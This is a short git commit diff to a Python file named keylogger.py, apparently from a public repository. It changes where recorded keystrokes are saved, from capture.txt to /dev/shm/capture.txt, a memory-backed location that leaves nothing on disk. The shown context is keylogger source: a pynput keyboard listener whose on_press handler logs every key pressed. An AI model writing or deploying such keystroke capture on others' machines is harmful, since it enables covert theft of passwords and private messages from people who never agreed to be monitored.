97c2971bdc0337d52d3206b555a0f4780c5b3577
alien-keric <102582785+alien-keric@users.noreply.github.com>
2024-05-10 18:01:12 -0400

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -6,7 +6,7 @@
 from pynput.keyboard import Key, Listener # you can to install the pynput library (pip install pyniput)
 import logging # allows the keystrokes recorded being saved into the file (capture.txt)
 
-logging.basicConfig(filename=("capture.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+logging.basicConfig(filename=("/dev/shm/capture.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
 def on_press(key):
   logging.info(str(key))
